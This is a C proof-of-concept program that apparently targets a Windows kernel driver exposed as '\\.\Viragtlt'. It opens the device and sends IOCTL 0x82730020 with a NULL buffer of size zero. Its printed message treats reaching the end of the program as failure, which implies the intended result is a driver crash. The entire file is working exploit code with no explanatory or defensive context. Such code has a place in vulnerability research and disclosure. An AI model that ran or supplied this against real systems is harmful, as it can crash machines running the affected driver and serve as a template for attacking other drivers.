#include <stdio.h>
#include <Windows.h>

int main()
{
	HANDLE hDevice;
	LPCWSTR lpDeviceName = L"\\\\.\\Viragtlt";
	DWORD bResult;
	DWORD junk = 0;

	wprintf(L" [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);

	hDevice = CreateFile(lpDeviceName,					// Name of the write
		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
		FILE_SHARE_WRITE,								// Allow Share
		NULL,											// Default security
		OPEN_EXISTING,									// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL);											// No attr. template

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Device Handle: 0x%p \n\n", hDevice);

	wprintf(L" [*] Lets send NULL to the Driver");

	bResult = DeviceIoControl(hDevice,	// Device to be queried
		0x82730020,						// Operation to perform
		NULL,				// Input Buffer		
		0,			// Buffer Size
		NULL, 0,						// Output Buffer
		&junk,							// # Bytes returned
		(LPOVERLAPPED)NULL);			// Synchronous I/O	

	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}
	wprintf(L" -> Done!\n");
	wprintf(L" [-] If go this, PoC failed...");
	CloseHandle(hDevice);
	return 0;
}